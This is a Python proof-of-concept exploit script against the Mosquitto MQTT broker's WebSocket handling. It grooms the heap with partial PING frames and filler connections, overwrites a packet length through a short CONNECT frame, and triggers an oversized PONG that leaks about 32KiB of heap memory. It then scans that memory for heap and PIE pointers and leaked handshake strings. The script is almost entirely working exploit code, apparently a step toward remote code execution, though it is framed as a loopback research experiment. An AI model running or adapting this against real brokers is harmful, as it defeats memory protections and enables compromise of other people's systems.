#!/usr/bin/env python3
"""MASKerade 32KiB PONG leak with live-connection heap groom.

Bounded experiment (2026-11-20 mosquitto2shell wake):
  - Drain 0xc0 tcache with 16 holders holding partial PINGs.
  - Source declares 174-byte CONNECT, sends 172, spare PING allocates the
    adjacent PONG buffer, 8 phantom frames walk the cursor, 4-byte
    packet_length=0x8010 overwrite.
  - NEW: create N live filler connections AFTER the overwrite but BEFORE
    completing the spare PING. context__init() allocates a pointer-bearing
    struct mosquitto (0x380) plus in_packet.packet_buffer and registers
    hh_sock.next/prev heap links. These land from top in the 32KiB window.
  - Complete spare PING -> 32776-byte leak; scan for heap/PIE pointers.
Loopback only. Stock-glibc 2.1.2 build from build-glibc.sh.
"""
import argparse
import re
import socket
import struct
import time

MASK = b"\x11\x22\x33\x44"


def masked_frame(opcode, payload, mask=MASK):
    n = len(payload)
    if n < 126:
        hdr = bytes((0x80 | opcode, 0x80 | n))
    elif n < 65536:
        hdr = bytes((0x80 | opcode, 0xFE)) + struct.pack("!H", n)
    else:
        hdr = bytes((0x80 | opcode, 0xFF)) + struct.pack("!Q", n)
    body = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return hdr + mask + body


def connect(port):
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    req = (f"GET /mqtt HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
           "Upgrade: websocket\r\nConnection: Upgrade\r\n"
           "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
           "Sec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: mqtt\r\n\r\n").encode()
    s.sendall(req)
    s.settimeout(3)
    data = b""
    while b"\r\n\r\n" not in data:
        c = s.recv(4096)
        if not c:
            break
        data += c
    if b"101" not in data.split(b"\r\n")[0]:
        raise RuntimeError("upgrade failed: " + repr(data[:200]))
    return s


def scan_pointers(buf):
    """Report plausible 64-bit heap/PIE pointers in little-endian bytes.

    Heap bases observed on this host span 0x55.., 0x5c.., 0x5d.. and 0x5f..;
    a 0x55-only window reported zero pointers on runs whose .bin held 64.
    Scan 8-byte-aligned slots (the leaked window starts at data+16, so its
    aligned pointer slots are aligned in the dump too) and require an
    8-byte-aligned value.
    """
    found = []
    for i in range(0, len(buf) - 7, 8):
        v = struct.unpack_from("<Q", buf, i)[0]
        if v % 8:
            continue
        if 0x0000500000000000 <= v <= 0x00006fffffffffff or \
           0x00007f0000000000 <= v <= 0x00007fffffffffff:
            found.append((i, v))
    return found


def scan_strings(buf):
    """Count WS-upgrade strings the report claims are visible in the leak."""
    out = []
    for needle in (b"127.0.0.1", b"Sec-WebSocket-Key", b"zzhZRbK+xOo="):
        offs = []
        start = 0
        while True:
            k = buf.find(needle, start)
            if k < 0:
                break
            offs.append(k)
            start = k + 1
        out.append((needle.decode(), offs))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=27081)
    ap.add_argument("--holders", type=int, default=16)
    ap.add_argument("--fillers", type=int, default=16,
                    help="live connections created after overwrite, before leak")
    ap.add_argument("--delay", type=float, default=0.12)
    ap.add_argument("--out", default="logs/groom-leak.bin")
    a = ap.parse_args()

    holders = []
    for _ in range(a.holders):
        s = connect(a.port)
        s.sendall(b"\x89\xfd" + MASK)  # masked PING len 125, payload withheld
        holders.append(s)
    print("holders with partial PING:", len(holders))

    spare = connect(a.port)            # handshake only
    src = connect(a.port)
    # MQTT CONNECT fixed header Remaining Length 174 (0xae 0x01), 172 body bytes
    src.sendall(masked_frame(0x82, bytes((0x10, 0xAE, 0x01)) + b"B" * 172))
    time.sleep(a.delay)
    spare.sendall(b"\x89\xfd" + MASK)  # PONG adjacent to source payload
    time.sleep(a.delay)
    src.sendall(masked_frame(0x82, b"") * 8)   # walk cursor to +0xcc
    time.sleep(a.delay)
    src.sendall(masked_frame(0x82, struct.pack("<I", 0x8010)))  # packet_length
    time.sleep(a.delay)

    # NEW groom: live pointer-bearing contexts in the 32KiB read window.
    fillers = []
    for i in range(a.fillers):
        f = connect(a.port)
        f.sendall(b"\x89\xfd" + MASK)  # partial PING: also allocate a PONG buffer
        fillers.append(f)
    print("live filler connections:", len(fillers))
    time.sleep(a.delay)

    victim = spare
    victim.sendall(MASK + b"P" * 125)
    time.sleep(0.6)

    victim.settimeout(3)
    chunks = []
    total = 0
    try:
        while True:
            c = victim.recv(65536)
            if not c:
                break
            chunks.append(c)
            total += len(c)
            if total > 200000:
                break
    except (socket.timeout, ConnectionResetError):
        pass
    data = b"".join(chunks)
    print("PONG bytes received:", total)
    print("frame header hint:", data[:4].hex() if data else "none")
    open(a.out, "wb").write(data)

    ptrs = scan_pointers(data)
    print("plausible heap/PIE pointers:", len(ptrs))
    for off, v in ptrs[:40]:
        print(f"  +0x{off:x}: 0x{v:016x}")
    for name, offs in scan_strings(data):
        print(f"leaked string {name}: count={len(offs)} first={[hex(x) for x in offs[:4]]}")

    for s in holders + fillers + [spare, src]:
        s.close()


if __name__ == "__main__":
    main()
